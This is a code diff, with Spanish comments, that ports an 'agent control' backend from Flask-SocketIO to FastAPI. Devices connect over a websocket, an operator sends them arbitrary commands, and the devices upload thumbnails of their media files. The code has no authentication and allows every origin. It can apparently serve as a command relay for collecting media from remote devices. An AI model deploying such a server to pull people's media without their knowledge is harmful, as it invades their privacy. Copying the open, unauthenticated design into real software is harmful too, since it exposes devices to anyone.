@@ -1,81 +1,66 @@
-# main.py (Versión 7.0 - Solo Medios, Arquitectura Legado)
-import eventlet
-eventlet.monkey_patch()
-
-import os
-from flask import Flask, jsonify, request
-from flask_socketio import SocketIO
-from flask_cors import CORS
 import json
-import time
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel
+from typing import List, Dict
 
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret-key-for-media-app'
-CORS(app)
-socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")
+# --- INICIALIZACIÓN DE LA APLICACIÓN ---
+app = FastAPI(title="Agente Control Backend - Versión Funcional")
+app.add_middleware(
+    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
+)
 
-media_storage = {}
-connected_agents = {}
+# --- "BASE DE DATOS" EN MEMORIA ---
+connected_agents: Dict[str, dict] = {}
+device_thumbnails_cache: Dict[str, list] = {}
 
-def log_info(message):
-    print(f"[INFO] {time.strftime('%H:%M:%S')} - {message}")
+# --- MODELOS DE DATOS ---
+class Command(BaseModel):
+    target_id: str
+    action: str
+    payload: str
 
-@app.route('/')
-def index():
-    return "Servidor de Agentes de Medios v7.0"
+class Thumbnail(BaseModel):
+    filename: str
+    thumbnail_b64: str
 
-@app.route('/api/get-agents', methods=['GET'])
-def get_agents():
-    return jsonify(list(connected_agents.values()))
+# --- ENDPOINTS (RUTAS DE LA API) ---
 
-@app.route('/api/send-command', methods=['POST'])
-def send_command():
-    data = request.json
-    target_id = data.get('target_id')
-    action = data.get('action')
-    
-    if action == 'get_thumbnails' and target_id in media_storage:
-        media_storage.pop(target_id, None)
+@app.websocket("/ws/{device_id}/{device_name:path}")
+async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
+    await websocket.accept()
+    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
+    connected_agents[device_id] = {"ws": websocket, "name": device_name}
+    try:
+        while True:
+            await websocket.receive_text()
+    except WebSocketDisconnect:
+        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
+        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
+        if device_id in connected_agents: del connected_agents[device_id]
+        if device_id in device_thumbnails_cache: del device_thumbnails_cache[device_id]
 
-    if not target_id or target_id not in connected_agents:
-        return jsonify({"status": "error", "message": "Agente no conectado"}), 404
+@app.get("/api/get-agents")
+async def get_agents():
+    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]
 
-    command_to_send = {'command': action.upper()}
-    socketio.send(json.dumps(command_to_send), to=target_id)
-    log_info(f"Comando '{action}' enviado a {target_id[:8]}")
-    return jsonify({"status": "success"})
+@app.post("/api/send-command")
+async def send_command_to_agent(command: Command):
+    target_id = command.target_id
+    if target_id not in connected_agents:
+        return {"status": "error"}
+    try:
+        await connected_agents[target_id]["ws"].send_text(command.json())
+        return {"status": "success"}
+    except Exception:
+        return {"status": "error"}
 
-@app.route('/api/get_media_list/<agent_id>', methods=['GET'])
-def get_media_list(agent_id):
-    log_info(f"Panel pide medios de {agent_id[:8]}")
-    media_list = media_storage.get(agent_id, [])
-    log_info(f"Enviando {len(media_list)} elementos.")
-    return jsonify(media_list)
+@app.post("/api/submit_media_list/{device_id}")
+async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
+    device_thumbnails_cache[device_id] = [thumb.dict() for thumb in thumbnails]
+    print(f"Recibidas {len(thumbnails)} miniaturas del agente '{connected_agents.get(device_id, {}).get('name', 'Desconocido')}'")
+    return {"status": "success"}
 
-@socketio.on('connect')
-def on_connect():
-    sid = request.sid
-    device_name = request.args.get('deviceName', 'Desconocido')
-    connected_agents[sid] = {'id': sid, 'name': device_name}
-    log_info(f"AGENTE CONECTADO: '{device_name}' (ID: {sid})")
-
-@socketio.on('disconnect')
-def on_disconnect():
-    sid = request.sid
-    if sid in connected_agents:
-        log_info(f"AGENTE DESCONECTADO: '{connected_agents[sid].get('name')}'")
-        connected_agents.pop(sid)
-        media_storage.pop(sid, None)
-
-@socketio.on('agent_response')
-def on_agent_response(data):
-    sid = request.sid
-    if sid not in connected_agents: return
-    
-    if data.get('event') == 'thumbnails_data':
-        payload = data.get('data', [])
-        media_storage[sid] = payload
-        log_info(f"Almacenados {len(payload)} elementos de {sid[:8]}")
-
-if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
+@app.get("/api/get_media_list/{device_id}")
+async def get_media_list(device_id: str):
+    return device_thumbnails_cache.get(device_id, [])
